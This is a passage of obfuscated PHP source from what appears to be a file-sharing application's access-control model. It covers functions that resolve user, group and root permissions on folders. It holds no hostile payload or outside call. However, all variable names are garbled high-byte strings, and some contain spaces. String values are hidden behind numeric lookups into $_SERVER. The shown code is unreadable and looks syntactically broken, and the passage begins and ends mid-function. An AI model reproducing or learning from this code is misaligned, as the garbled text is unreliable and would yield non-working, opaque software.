$this->getAllChildrenByUser($ËİàÔ÷æ, $½íÈëĞ§); if (!$Å¿óÄã || !$’ ¼å ö) { return !1; } foreach ($’ ¼å ö as $Ÿâ¨­¼¶) { $õ¥äĞğ = array(); foreach ($Ÿâ¨­¼¶[$ñæ©Ü[2377]] as $¦ÆÛÙ¹¡) { $ Ù¯šáÅ = $¦ÆÛÙ¹¡[$ñæ©Ü[556]]; $””’ÛŒè = $¦ÆÛÙ¹¡[$ñæ©Ü[1589]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÕÔ–›Í» = $¦ÆÛÙ¹¡[$ñæ©Ü[1589]] ? $¦ÆÛÙ¹¡[$ñæ©Ü[1589]] : $¦ÆÛÙ¹¡[$ñæ©Ü[1491]]; if ($¦ÆÛÙ¹¡[$ñæ©Ü[1589]] && $¦ÆÛÙ¹¡[$ñæ©Ü[1589]] == $½íÈëĞ§) { continue; } $õ¥äĞğ[] = array($ñæ©Ü[191] => $Ÿâ¨­¼¶[$ñæ©Ü[191]], $ñæ©Ü[188] => $””’ÛŒè, $ñæ©Ü[589] => intval($ÕÔ–›Í»), $ñæ©Ü[1637] => isset($ Ù¯šáÅ[$ñæ©Ü[487]]) ? intval($ Ù¯šáÅ[$ñæ©Ü[487]]) : 0, $ñæ©Ü[2341] => isset($ Ù¯šáÅ[$ñæ©Ü[2341]]) ? intval($ Ù¯šáÅ[$ñæ©Ü[2341]]) : -1); } $õ¥äĞğ[] = array($ñæ©Ü[191] => $Ÿâ¨­¼¶[$ñæ©Ü[191]], $ñæ©Ü[188] => SourceModel::TYPE_USER, $ñæ©Ü[589] => intval($½íÈëĞ§), $ñæ©Ü[1637] => intval($Å¿óÄã), $ñæ©Ü[2341] => -1); $this->where(array($ñæ©Ü[506] => $Ÿâ¨­¼¶[$ñæ©Ü[191]]))->delete(); $this->addAll($õ¥äĞğ); } return !0; } public function get($Ò“Îƒ) { $İµŞ„éì = $this->getSourceList(array($Ò“Îƒ), !0); return $İµŞ„éì[0]; } public function getSourceList($Ë†¡åèÃ, $áŞõ¶£ì = false, $ßŞğŒº = false) { $ËªËÃÈ =& $_SERVER[œ—üé‹ê]; if (!$Ë†¡åèÃ) { return array(); } $ÜŠı³¸« = Model($ËªËÃÈ[1530]); if (!$áŞõ¶£ì && count($Ë†¡åèÃ) == 1) { $áŞõ¶£ì = array(); $áŞõ¶£ì[$Ë†¡åèÃ[0]] = $ÜŠı³¸«->sourceInfo($Ë†¡åèÃ[0]); } if (!$áŞõ¶£ì) { $®±Ú¤³Û = array($ËªËÃÈ[506] => array($ËªËÃÈ[507], $Ë†¡åèÃ)); $áŞõ¶£ì = $ÜŠı³¸«->field($ËªËÃÈ[2382])->where($®±Ú¤³Û)->select(); $áŞõ¶£ì = array_to_keyvalue($áŞõ¶£ì, $ËªËÃÈ[191]); } $é’Âí˜ = $Ë†¡åèÃ; foreach ($áŞõ¶£ì as $ÑşèëÒì => $òßŒ®”ğ) { $´´³áÂ = $ÜŠı³¸«->parentLevelArray($òßŒ®”ğ[$ËªËÃÈ[604]]); $é’Âí˜ = array_merge($é’Âí˜, array(intval($ÑşèëÒì)), array_reverse($´´³áÂ)); } $é’Âí˜ = array_values(array_unique($é’Âí˜)); if (!$é’Âí˜) { return array(); } $Ãì¢»îÓ = $this->sourceAuthSelect($é’Âí˜); $´œñİªÎ = array(); foreach ($é’Âí˜ as $¹¹âÔÑ²) { if (isset($Ãì¢»îÓ[$¹¹âÔÑ²])) { $´œñİªÎ[$¹¹âÔÑ²] = $Ãì¢»îÓ[$¹¹âÔÑ²]; } } $ş³æ ¨× = $this->userIsRoot($ßŞğŒº); $±ÕÒ»š£ = AuthModel::authAll(); $ÈíœËƒ¸ = array($ËªËÃÈ[503] => $±ÕÒ»š£, $ËªËÃÈ[2383] => array($ËªËÃÈ[508] => 0, $ËªËÃÈ[2184] => $±ÕÒ»š£, $ËªËÃÈ[509] => LNG($ËªËÃÈ[2364]), $ËªËÃÈ[2199] => $ËªËÃÈ[2365])); $µñ£‰½ = array(); foreach ($áŞõ¶£ì as $¹¹âÔÑ² => $Ç³§÷ÂÜ) { if ($ş³æ ¨× && $GLOBALS[$ËªËÃÈ[6]][$ËªËÃÈ[2197]]) { $µñ£‰½[$¹¹âÔÑ²] = $ÈíœËƒ¸; continue; } $µñ£‰½[$¹¹âÔÑ²] = $this->makeSourceAuth($Ç³§÷ÂÜ, $´œñİªÎ, $ßŞğŒº); } return $µñ£‰½; } public function authDeepCheck($’ŞÌ´á¿, $¥›ê·ÆÑ = false) { $¢–‚€Ù =& $_SERVER[œ—üé‹ê]; $¥›ê·ÆÑ = $¥›ê·ÆÑ ? $¥›ê·ÆÑ : USER_ID; $˜¡¤ªç„ = $this->makeAuthDeep($¥›ê·ÆÑ); if (!in_array($’ŞÌ´á¿, $˜¡¤ªç„[$¢–‚€Ù[2384]])) { return !1; } $Ñ©ÕÉÄš = array(); foreach ($˜¡¤ªç„[$¢–‚€Ù[2385]] as $ÙÂèÆÏ¯ => $áñó´€‚) { if (!in_array($’ŞÌ´á¿, $áñó´€‚)) { continue; } $Ñ©ÕÉÄš[] = $ÙÂèÆÏ¯; } if (!$Ñ©ÕÉÄš) { return !1; } $¦Æ˜ÆŸš = $Ñ©ÕÉÄš ? $Ñ©ÕÉÄš[0] : $’ŞÌ´á¿; return array($¢–‚€Ù[503] => -1, $¢–‚€Ù[556] => array($¢–‚€Ù[508] => $¢–‚€Ù[1376], $¢–‚€Ù[2184] => $¢–‚€Ù[228], $¢–‚€Ù[509] => LNG($¢–‚€Ù[2386]), $¢–‚€Ù[2199] => $¢–‚€Ù[2387]), $¢–‚€Ù[2375] => LNG($¢–‚€Ù[2388]), $¢–‚€Ù[2389] => $this->sourceAuthInfo($¦Æ˜ÆŸš)); } protected function makeAuthDeep($øÇäÜ¬õ = false) { $›·è¿ì™ =& $_SERVER[œ—üé‹ê]; static $§µŸ÷Ú = array(); $øÇäÜ¬õ = $øÇäÜ¬õ ? $øÇäÜ¬õ : USER_ID; if (isset($§µŸ÷Ú[$øÇäÜ¬õ])) { return $§µŸ÷Ú[$øÇäÜ¬õ]; } $¤îíù ˜ = Model($›·è¿ì™[2390])->listData(); $Øëô›œ = array(); foreach ($¤îíù ˜ as $ÉøµëªÖ) { if ($ÉøµëªÖ[$›·è¿ì™[502]] == 0 && $ÉøµëªÖ[$›·è¿ì™[2198]] == $›·è¿ì™[91]) { $Øëô›œ[] = $ÉøµëªÖ[$›·è¿ì™[487]]; } } $†óó…Ò = $this->userGroupParents($øÇäÜ¬õ); $”Ô®Üç¸ = array($›·è¿ì™[188] => SourceModel::TYPE_USER, $›·è¿ì™[589] => $øÇäÜ¬õ); if ($†óó…Ò) { $”Ô®Üç¸ = array(array($›·è¿ì™[188] => SourceModel::TYPE_USER, $›·è¿ì™[589] => $øÇäÜ¬õ), array($›·è¿ì™[188] => SourceModel::TYPE_GROUP, $›·è¿ì™[589] => array($›·è¿ì™[507], $†óó…Ò)), $›·è¿ì™[1167] => $›·è¿ì™[2280]); } $¹¿¡Ø„ã = $this->field($›·è¿ì™[2391])->where($”Ô®Üç¸)->select(); $×â¾¼©å = array(); $¶ëŞ·†ù = array_to_keyvalue_group($¹¿¡Ø„ã, $›·è¿ì™[191]); foreach ($¶ëŞ·†ù as $êÅÆéıï => $Ö‹ş²š’) { $‚ÁÆ®«¦ = $this->authArrayCheck($Ö‹ş²š’, $øÇäÜ¬õ); if ($‚ÁÆ®«¦[$›·è¿ì™[503]] > 0) { $×â¾¼©å[] = $êÅÆéıï . $›·è¿ì™[12]; } } if ($†óó…Ò) { $‡Œú = Model($›·è¿ì™[605]); foreach ($†óó…Ò as $Ù®İ„¨×) { $£ğÜ™èÖ = $‡Œú->getInfo($Ù®İ„¨×); if (!$£ğÜ™èÖ || !is_array($£ğÜ™èÖ[$›·è¿ì™[90]])) { continue; } $×â¾¼©å[] = $£ğÜ™èÖ[$›·è¿ì™[90]][$›·è¿ì™[191]]; } } $ˆáŠÔ¯› = array(); $áÌêªá = $†óó…Ò; $ë¯Õèã¾ = Model($›·è¿ì™[1530]); $‡Œú = Model($›·è¿ì™[605]); $öèÎ¿Ó÷ = array(); $îŸ õç = array(); $ö²óö = array(); $³íúÎñÃ = array(); if ($×â¾¼©å) { $úÚÎ‘ = $ë¯Õèã¾->where(array($›·è¿ì™[191] => array($›·è¿ì™[507], $×â¾¼©å)))->select(); foreach ($úÚÎ‘ as $ÂÒ‡…Â£) { if ($ÂÒ‡…Â£[$›·è¿ì™[520]] == $›·è¿ì™[91]) { continue; } $Ôú±Øß = $ë¯Õèã¾->parentLevelArray($ÂÒ‡…Â£[$›·è¿ì™[604]]); $ˆáŠÔ¯› = array_merge($ˆáŠÔ¯›, $Ôú±Øß); $áÌêªá[] = $ÂÒ‡…Â£[$›·è¿ì™[589]]; $öèÎ¿Ó÷[$ÂÒ‡…Â£[$›·è¿ì™[191]]] = $Ôú±Øß; $îŸ õç[$ÂÒ‡…Â£[$›·è¿ì™[191]]] = $ÂÒ‡…Â£[$›·è¿ì™[589]]; } } $áÌêªá = array_values(array_unique($áÌêªá)); $€‚£î†Ù = $áÌêªá; foreach ($€‚£î†Ù as $Ù®İ„¨×) { $£ğÜ™èÖ = $‡Œú->getInfo($Ù®İ„¨×); $Ôú±Øß = $ë¯Õèã¾->parentLevelArray($£ğÜ™èÖ[$›·è¿ì™[604]]); $áÌêªá = array_merge($áÌêªá, $Ôú±Øß); } $áÌêªá = array_values(array_unique($áÌêªá)); foreach ($áÌêªá as $Ù®İ„¨×) { $£ğÜ™èÖ = $‡Œú->getInfo($Ù®İ„¨×); $ˆáŠÔ¯›[] = $£ğÜ™èÖ[$›·è¿ì™[90]][$›·è¿ì™[191]]; $ö²óö[$Ù®İ„¨×] = $£ğÜ™èÖ[$›·è¿ì™[90]][$›·è¿ì™[191]]; $³íúÎñÃ[$Ù®İ„¨×] = $ë¯Õèã¾->parentLevelArray($£ğÜ™èÖ[$›·è¿ì™[604]]); } foreach ($öèÎ¿Ó÷ as $¿´ô˜íÇ => $ëâÅíıŠ) { $÷ºÀçû† = $îŸ õç[$¿´ô˜íÇ]; if (!$÷ºÀçû† || !$ö²óö[$÷ºÀçû†]) { continue; } $’ãŸ¼ = array(); foreach ($³íúÎñÃ[$÷ºÀçû†] as $Ù®İ„¨×) { $’ãŸ¼[] = $ö²óö[$Ù®İ„¨×]; } $öèÎ¿Ó÷[$¿´ô˜íÇ] = array_merge($’ãŸ¼, $ëâÅíıŠ); } $ˆáŠÔ¯› = array_values(array_unique($ˆáŠÔ¯›)); $ÁàşÚ”â = array($›·è¿ì™[2384] => $ˆáŠÔ¯›, $›·è¿ì™[2385] => $öèÎ¿Ó÷); $§µŸ÷Ú[$øÇäÜ¬õ] = $ÁàşÚ”â; return $ÁàşÚ”â; } private function makeSourceAuth($üÂ˜¦Ì, $™º¯€é, $Š×£…Î  = false) { $’ë‹Úíı =& $_SERVER[œ—üé‹ê]; $ø«ÓÎÁ = $’ë‹Úíı[91]; $ÙäÂóËº = $üÂ˜¦Ì[$’ë‹Úíı[589]]; $ÅôÕá“ğ = $üÂ˜¦Ì[$’ë‹Úíı[188]] == SourceModel::TYPE_GROUP; $›˜éúÛÓ = $ÅôÕá“ğ ? $this->groupRootAuth($ÙäÂóËº, $Š×£…Î ) : !1; if ($›˜éúÛÓ && Model($’ë‹Úíı[591])->authCheckAction($›˜éúÛÓ[$’ë‹Úíı[502]], $’ë‹Úíı[1561])) { return $this->groupAuthInfo($›˜éúÛÓ, $ÙäÂóËº); } $¡Ò×˜á = Model($’ë‹Úíı[1530])->parentLevelArray($üÂ˜¦Ì[$’ë‹Úíı[604]]); $¡Ò×˜á = array_merge(array($üÂ˜¦Ì[$’ë‹Úíı[191]]), array_reverse($¡Ò×˜á)); $ˆßï¥š = !1; foreach ($¡Ò×˜á as $ïÆÔÜ‡) { if (!isset($™º¯€é[$ïÆÔÜ‡])) { continue; } $ƒ¬êêõ = $this->authMake($™º¯€é[$ïÆÔÜ‡], $Š×£…Î ); if ($ƒ¬êêõ[$’ë‹Úíı[556]]) { $ˆßï¥š = $ƒ¬êêõ; break; } } if (!$ÅôÕá“ğ) { return $ˆßï¥š; } if (!$ˆßï¥š && $›˜éúÛÓ) { $ˆßï¥š = $this->groupAuthInfo($›˜éúÛÓ, $ÙäÂóËº); } if (!$ˆßï¥š) { $¾¸¸„äª = Model($’ë‹Úíı[605])->getInfo($ÙäÂóËº); $­’ñòà = explode($’ë‹Úíı[50], trim($¾¸¸„äª[$’ë‹Úíı[604]], $’ë‹Úíı[50])); $­’ñòà = array_reverse($­’ñòà); foreach ($­’ñòà as $˜ÚÀ¶Ï) { if ($˜ÚÀ¶Ï == $’ë‹Úíı[228] || $˜ÚÀ¶Ï == $ø«ÓÎÁ) { continue; } $Ü¢ó¥šè = $this->groupRootAuth($˜ÚÀ¶Ï, $Š×£…Î ); if (!$Ü¢ó¥šè) { continue; } $ˆßï¥š = $this->groupAuthInfo($Ü¢ó¥šè, $˜ÚÀ¶Ï); break; } } if (!$ˆßï¥š || $ˆßï¥š[$’ë‹Úíı[503]] <= 0) { $Àã«ï¦Å = $this->authDeepCheck($üÂ˜¦Ì[$’ë‹Úíı[191]], $Š×£…Î ); if ($Àã«ï¦Å) { $ˆßï¥š = $Àã«ï¦Å; } } return $ˆßï¥š; } private function userIsRoot($ˆıÁæÀ¯ = false) { $²ŠÁåâ» =& $_SERVER[œ—üé‹ê]; if (!$ˆıÁæÀ¯ && KodUser::isRoot()) { return !0; } $öÀìöö€ = Model($²ŠÁåâ»[617])->getInfo($ˆıÁæÀ¯); $õéü¹÷ƒ = Model($²ŠÁåâ»[2368])->listData($öÀìöö€[$²ŠÁåâ»[2369]]); if ($õéü¹÷ƒ && $õéü¹÷ƒ[$²ŠÁåâ»[595]][$²ŠÁåâ»[2372]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¬Äø¹¯›) { $¥ Ôé‡› =& $_SERVER[œ—üé‹ê]; $ÂÍ¸ãƒë = Model($¥ Ôé‡›[1530]); $–©ËÃ… = $ÂÍ¸ãƒë->sourceInfo($¬Äø¹¯›); if (!$–©ËÃ…) { return !1; } $ÂÍ¸ãƒë->groupPathDisplay($–©ËÃ…); $ŸÆÄš–¾ = array($–©ËÃ…); $ŸÆÄš–¾ = $ÂÍ¸ãƒë->_listAppendPath($ŸÆÄš–¾, !1); $–©ËÃ… = $ŸÆÄš–¾[0]; $´µï‚Æ = $–©ËÃ…[$¥ Ôé‡›[602]]; if (isset($–©ËÃ…[$¥ Ôé‡›[610]])) { $Õã°»±å = explode($¥ Ôé‡›[8], trim($–©ËÃ…[$¥ Ôé‡›[602]], $¥ Ôé‡›[8])); array_shift($Õã°»±å); $´µï‚Æ = $–©ËÃ…[$¥ Ôé‡›[608]] . $¥ Ôé‡›[2392] . implode($¥ Ôé‡›[8], $Õã°»±å); } return array($¥ Ôé‡›[32] => $–©ËÃ…[$¥ Ôé‡›[32]], $¥ Ôé‡›[191] => $–©ËÃ…[$¥ Ôé‡›[191]], $¥ Ôé‡›[87] => KodIO::make($–©ËÃ…[$¥ Ôé‡›[191]]), $¥ Ôé‡›[602] => $´µï‚Æ); } private function groupAuthInfo($ÅÆÊ‰š›, $¼¸‚Àİ) { $«ç—à­Í =& $_SERVER[œ—üé‹ê]; $êš¹• = Model($«ç—à­Í[605])->getInfo($¼¸‚Àİ); return array($«ç—à­Í[2393] => intval($ÅÆÊ‰š›[$«ç—à­Í[502]]), $«ç—à­Í[2383] => $ÅÆÊ‰š›, $«ç—à­Í[2394] => LNG($«ç—à­Í[2395]), $«ç—à­Í[2389] => array($«ç—à­Í[509] => $êš¹•[$«ç—à­Í[32]], $«ç—à­Í[87] => KodIO::make($êš¹•[$«ç—à­Í[90]][$«ç—à­Í[191]]), $«ç—à­Í[2396] => $êš¹•[$«ç—à­Í[609]])); } protected function groupRootAuth($½¼Ã›…, $†øùÜšÒ = false) { $Ó—£«ª¢ =& $_SERVER[œ—üé‹ê]; $†øùÜšÒ = $†øùÜšÒ ? $†øùÜšÒ : USER_ID; $î¾õûÑë = $†øùÜšÒ . $Ó—£«ª¢[2397] . $½¼Ã›…; static $‘÷Ãüô° = array(); if (isset($‘÷Ãüô°[$î¾õûÑë])) { return $‘÷Ãüô°[$î¾õûÑë]; } $åİ—”ÖÎ = Model($Ó—£«ª¢[605])->getInfo($½¼Ã›…); $¸©ş¸« = $this->userGroupList($†øùÜšÒ); $äÎ¬Ê¡ = isset($¸©ş¸«[$½¼Ã›…]) ? $¸©ş¸«[$½¼Ã›…][$Ó—£«ª¢[502]] : !1; if ($äÎ¬Ê¡ && Model($Ó—£«ª¢[591])->authCheckAction($äÎ¬Ê¡[$Ó—£«ª¢[502]], $Ó—£«ª¢[1561])) { $‘÷Ãüô°[$î¾õûÑë] = $äÎ¬Ê¡; return $äÎ¬Ê¡; } $İòŞ†¡ = $this->sourceAuthSelect($åİ—”ÖÎ[$Ó—£«ª¢[90]][$Ó—£«ª¢[191]]); $°åù¦­ = $İòŞ†¡ ? $this->authMake($İòŞ†¡, $†øùÜšÒ) : !1; $‘Ğî³Ûİ = $°åù¦­ ? $°åù¦­[$Ó—£«ª¢[556]] : !1; $‘÷Ãüô°[$î¾õûÑë] = $‘Ğî³Ûİ ? $‘Ğî³Ûİ : $äÎ¬Ê¡; return $‘÷Ãüô°[$î¾õûÑë]; } public function authOwnerApply($ÁÅÀµÑÙ) { $çë£À–’ =& $_SERVER[œ—üé‹ê]; if (empty($ÁÅÀµÑÙ[$çë£À–’[502]]) || isset($ÁÅÀµÑÙ[$çë£À–’[1580]]) && $ÁÅÀµÑÙ[$çë£À–’[1580]]) { return $ÁÅÀµÑÙ; } if (AuthModel::authCheckRoot($ÁÅÀµÑÙ[$çë£À–’[502]][$çë£À–’[503]])) { return $ÁÅÀµÑÙ; } $Şöæ¤Ã– = Model($çë£À–’[1530])->parentLevelArray($ÁÅÀµÑÙ[$çë£À–’[604]]); $Şöæ¤Ã– = array_merge(array($ÁÅÀµÑÙ[$çë£À–’[191]]), array_reverse($Şöæ¤Ã–)); $íø®…¾Ì = $this->sourceAuthSelect($Şöæ¤Ã–); $Âà³Ã®§ = array(); $Á­•šè = array(); foreach ($íø®…¾Ì as $ ›´Ú·Ğ => $ÉŞ©‹) { $Ù¤¿…ğ = $this->authFolderOwnerUser($ÉŞ©‹); $Âà³Ã®§[$ ›´Ú·Ğ] = $Ù¤¿…ğ; $Á­•šè = array_merge($Á­•šè, $Ù¤¿…ğ[$çë£À–’[684]]); if ($Ù¤¿…ğ[$çë£À–’[2398]]) { break; } } if (count($Á­•šè) == 0) { $Á­•šè = $this->authFolderOwnerGroup($ÁÅÀµÑÙ[$çë£À–’[589]]); } $Á­•šè = array_unique($Á­•šè); if (AuthModel::authCheckRoot($ÁÅÀµÑÙ[$çë£À–’[502]][$çë£À–’[503]])) { $Á­•šè[] = USER_ID; } $ÁÅÀµÑÙ[$çë£À–’[502]][$çë£À–’[2399]] = Model($çë£À–’[597])->userListInfo($Á­•šè); return $ÁÅÀµÑÙ; } private function authFolderOwnerGroup($õ¯Ìƒ ™) { $¬Ïü½ş¡ =& $_SERVER[œ—üé‹ê]; $¼Æ®¤§œ = Model($¬Ïü½ş¡[2272])->where(array($¬Ïü½ş¡[1491] => $õ¯Ìƒ ™))->select(); $ØŞ¼­ƒ = array(); if (!$¼Æ®¤§œ) { return $ØŞ¼­ƒ; } foreach ($¼Æ®¤§œ as $Ùƒ¡ˆ“È) { $ÙÂĞ©­§ = $this->authInfo($Ùƒ¡ˆ“È); if (AuthModel::authCheckRoot($ÙÂĞ©­§[$¬Ïü½ş¡[502]])) { $ØŞ¼­ƒ[] = $Ùƒ¡ˆ“È[$¬Ïü½ş¡[1589]]; } } return $ØŞ¼­ƒ; } private function authFolderOwnerUser($£áîäÍ¸) { $¨×Á™î¹ =& $_SERVER[œ—üé‹ê]; $§…”ù–Õ = array(); $ÃæËı„æ = !1; foreach ($£áîäÍ¸ as $ˆø»ØæÛ) { $ÏŠ‹¥öÚ = $this->authInfo($ˆø»ØæÛ); if ($ˆø»ØæÛ[$¨×Á™î¹[589]] == $¨×Á™î¹[228]) { $ÃæËı„æ = !0; } if ($ˆø»ØæÛ[$¨×Á™î¹[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÏŠ‹¥öÚ[$¨×Á™î¹[502]])) { $§…”ù–Õ[] = $ˆø»ØæÛ[$¨×Á™î¹[589]]; } } } return array($¨×Á™î¹[684] => $§…”ù–Õ, $¨×Á™î¹[2398] => $ÃæËı„æ); } public function authMake($«’Ë†´Ï, $À©Ä¯‘ò = false) { $ ¼¢½ùç =& $_SERVER[œ—üé‹ê]; $÷¥Àì«“ = $this->authArrayCheck($«’Ë†´Ï, $À©Ä¯‘ò); if ($÷¥Àì«“[$ ¼¢½ùç[2379]]) { $÷¥Àì«“[$ ¼¢½ùç[2379]] = $this->sourceAuthInfo($÷¥Àì«“[$ ¼¢½ùç[2379]]); } return $÷¥Àì«“; } public function authArrayCheck($ü¶Ö‰Ö³, $„ÇÂçï¨ = false) { $äªÛƒé =& $_SERVER[œ—üé‹ê]; if (!$ü¶Ö‰Ö³) { return array($äªÛƒé[503] => 0, $äªÛƒé[556] => !1, $äªÛƒé[2394] => $äªÛƒé[12]); } $„ÇÂçï¨ = $„ÇÂçï¨ ? $„ÇÂçï¨ : USER_ID; $ï€¦ª£Ë = 0; $ÔùÏâ³È = 0; $ô˜Š×¢ò = 0; $ã­á¸¹û = 0; $ã…øçú¼ = 0; $ˆú’˜Ğ = 0; $ÒÓÍıëÕ = 0; $Ê³¾¿¥ = 0; $ñ™ú×Ø… = 1000; $Û‡À€Ê” = 0; $¼ãíï· = 0; $ñ„‘Èàå = 0; $–åß‰Ë— = 0; $ëü´œåÛ = 0; foreach ($ü¶Ö‰Ö³ as $†éâÎ) { $’Óô…–™ = $this->authInfo($†éâÎ); if (!$’Óô…–™) { continue; } $ÌÈ”µìİ = $†éâÎ[$äªÛƒé[589]]; $ÁµâÖšœ = $†éâÎ[$äªÛƒé[191]]; $ àØä‹˜ = intval($’Óô…–™[$äªÛƒé[502]]); if ($†éâÎ[$äªÛƒé[188]] == SourceModel::TYPE_USER && $ÌÈ”µìİ == $„ÇÂçï¨) { $ï€¦ª£Ë = !0; $ô˜Š×¢ò = $’Óô…–™; $ÔùÏâ³È = $ àØä‹˜; $ã­á¸¹û = $ÁµâÖšœ; } else { if ($†éâÎ[$äªÛƒé[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÌÈ”µìİ, $„ÇÂçï¨)) { $ã…øçú¼ = !0; $‰ı’è´™ = $this->groupStepToUserGroup($ÌÈ”µìİ, $„ÇÂçï¨); if ($‰ı’è´™ < $ñ™ú×Ø…) { $ñ™ú×Ø… = $‰ı’è´™; $ˆú’˜Ğ = $ àØä‹˜; $ÒÓÍıëÕ = $’Óô…–™; $Û‡À€Ê” = $ÌÈ”µìİ; $Ê³¾¿¥ = $ÁµâÖšœ; } if ($‰ı’è´™ == $ñ™ú×Ø… && $ àØä‹˜ >= $ˆú’˜Ğ) { $ˆú’˜Ğ = $ àØä‹˜; $ÒÓÍıëÕ = $’Óô…–™; $Û‡À€Ê” = $ÌÈ”µìİ; $Ê³¾¿¥ = $ÁµâÖšœ; } } else { if (!$ÌÈ”µìİ || $ÌÈ”µìİ == $äªÛƒé[228]) { $¼ãíï· = !0; $–åß‰Ë— = $’Óô…–™; $ñ„‘Èàå = $ àØä‹˜; $ëü´œåÛ = $ÁµâÖšœ; } } } } if ($ï€¦ª£Ë) { $©õ÷÷äÉ = $ÔùÏâ³È; $’Óô…–™ = $ô˜Š×¢ò; $œõ÷šÜ = $ã­á¸¹û; $Ì¯öã±¢ = LNG($äªÛƒé[2400]); } else { if ($ã…øçú¼) { $©õ÷÷äÉ = $ˆú’˜Ğ; $’Óô…–™ = $ÒÓÍıëÕ; $œõ÷šÜ = $Ê³¾¿¥; $ï„ÍéŠ½ = Model($äªÛƒé[605])->getInfo($Û‡À€Ê”); $Ì¯öã±¢ = $äªÛƒé[173] . $ï„ÍéŠ½[$äªÛƒé[609]] . $äªÛƒé[2401] . LNG($äªÛƒé[2402]); } else { if ($¼ãíï·) { $©õ÷÷äÉ = $ñ„‘Èàå; $’Óô…–™ = $–åß‰Ë—; $œõ÷šÜ = $ëü´œåÛ; $Ì¯öã±¢ = LNG($äªÛƒé[2381]); } else { $©õ÷÷äÉ = 0; $’Óô…–™ = !1; $Ì¯öã±¢ = $äªÛƒé[12]; $œõ÷šÜ = $äªÛƒé[12]; } } } $¸³Üµİ£ = array($äªÛƒé[2393] => intval($©õ÷÷äÉ), $äªÛƒé[2383] => $’Óô…–™, $äªÛƒé[2394] => $Ì¯öã±¢, $äªÛƒé[2389] => $œõ÷šÜ); return $¸³Üµİ£; } private function groupContainUser($“…›è·¥, $¢‡´©Æ = false) { return in_array($“…›è·¥, $this->userGroupParents($¢‡´©Æ)); } private function groupStepToUserGroup($×Úö¨, $°“‡·Ì° = false) { $àåÚ‚öï =& $_SERVER[œ—üé‹ê]; $à×¹éÄ = $this->userGroupList($°“‡·Ì°); $Öô‘ûıØ = 1000; $•ŞÒÀºì = $GLOBALS[$àåÚ‚öï[6]][$àåÚ‚öï[92]][$àåÚ‚öï[2285]] == 1; $²ñ³©¨‹ = $•ŞÒÀºì ? 3 : 2; foreach ($à×¹éÄ as $ˆ€÷‚îï) { if ($ˆ€÷‚îï[$àåÚ‚öï[1491]] == $×Úö¨) { return 0; } $Õµ¨ÚÁİ = explode($àåÚ‚öï[50], trim($ˆ€÷‚îï[$àåÚ‚öï[604]], $àåÚ‚öï[50])); if ($Õµ¨ÚÁİ[0] == $àåÚ‚öï[228] && count($Õµ¨ÚÁİ) > $²ñ³©¨‹) { $š‰ò¯ñœ = array_reverse(array_slice($Õµ¨ÚÁİ, $²ñ³©¨‹)); $²Šá÷œ“ = array_search($×Úö¨, $š‰ò¯ñœ); if ($²Šá÷œ“ !== !1 && $²Šá÷œ“ + 1 <= $Öô‘ûıØ) { $Öô‘ûıØ = $²Šá÷œ“ + 1; } } } return $Öô‘ûıØ; } private function userGroupList($Å´µš¿ = false, $×áì¹İó = false) { $şÄ’Øíó =& $_SERVER[œ—üé‹ê]; static $ÑÃ£‚Ÿ = array(); if (isset($ÑÃ£‚Ÿ[$Å´µš¿])) { return $ÑÃ£‚Ÿ[$Å´µš¿]; } if (!$×áì¹İó) { $×áì¹İó = Model($şÄ’Øíó[617])->getInfo($Å´µš¿); } $ÑÃ£‚Ÿ[$Å´µš¿] = array_to_keyvalue($×áì¹İó[$şÄ’Øíó[1490]], $şÄ’Øíó[1491]); return $ÑÃ£‚Ÿ[$Å´µš¿]; } public function userGroupParents($÷¤™»Ÿä) { $âš ¦Ôî =& $_SERVER[œ—üé‹ê]; static $Ó„Â€¿Ï = array(); $÷¤™»Ÿä = $÷¤™»Ÿä ? $÷¤™»Ÿä : USER_ID; if (isset($Ó„Â€¿Ï[$÷¤™»Ÿä])) { return $Ó„Â€¿Ï[$÷¤™»Ÿä]; } $Û¨‘‰¬ö = $this->userGroupList($÷¤™»Ÿä); $ş îæÆõ = array(); $ÄÁ£È› = $GLOBALS[$âš ¦Ôî[6]][$âš ¦Ôî[92]][$âš ¦Ôî[2285]] == 1; $¢Öàõ¸½ = $ÄÁ£È› ? 3 : 2; foreach ($Û¨‘‰¬ö as $ŠŒÔ¥Ì) { $„¢ˆ„–Ñ = array($ŠŒÔ¥Ì[$âš ¦Ôî[1491]]); $íèÇ¿¥ = explode($âš ¦Ôî[50], trim($ŠŒÔ¥Ì[$âš ¦Ôî[604]], $âš ¦Ôî[50])); if ($íèÇ¿¥[0] == $âš ¦Ôî[228] && count($íèÇ¿¥) > $¢Öàõ¸½) { $Œœ³éÁ¡ = array_slice($íèÇ¿¥, $¢Öàõ¸½); $„¢ˆ„–Ñ = array_merge($„¢ˆ„–Ñ, array_reverse($Œœ³éÁ¡)); } $ş îæÆõ = array_merge($ş îæÆõ, $„¢ˆ„–Ñ); } $Ó„Â€¿Ï[$÷¤™»Ÿä] = array_unique($ş îæÆõ); return $Ó„Â€¿Ï[$÷¤™»Ÿä]; } public function authTargetInfoMake($âşíõ‡ê) { $Ñ–¦½Æé =& $_SERVER[œ—üé‹ê]; $½¤È½é¥ = array(); $úºôò÷õ = array(); foreach ($âşíõ‡ê as $áÓÉ¬®š) { if ($áÓÉ¬®š[$Ñ–¦½Æé[188]] == SourceModel::TYPE_USER) { $½¤È½é¥[] = intval($áÓÉ¬®š[$Ñ–¦½Æé[589]]); } else { if ($áÓÉ¬®š[$Ñ–¦½Æé[188]] == SourceModel::TYPE_GROUP) { $úºôò÷õ[] = intval($áÓÉ¬®š[$Ñ–¦½Æé[589]]); } } } if ($½¤È½é¥) { $½¤È½é¥ = Model($Ñ–¦½Æé[597])->userListInfo($½¤È½é¥); } if ($úºôò÷õ) { $³­Ú¡âş = array($Ñ–¦½Æé[2265] => array($Ñ–¦½Æé[507], $úºôò÷õ)); $úºôò÷õ = Model($Ñ–¦½Æé[605])->field($Ñ–¦½Æé[2403])->where($³­Ú¡âş)->select(); $úºôò÷õ = array_to_keyvalue($úºôò÷õ, $Ñ–¦½Æé[1491]); } return array($Ñ–¦½Æé[2404] => $½¤È½é¥, $Ñ–¦½Æé[2405] => $úºôò÷õ); } public function authInfo($ğÍè¬¼›) { $…ãÍá£± =& $_SERVER[œ—üé‹ê]; if ($ğÍè¬¼›[$…ãÍá£±[1637]]) { $¶üùÂ¸ª = 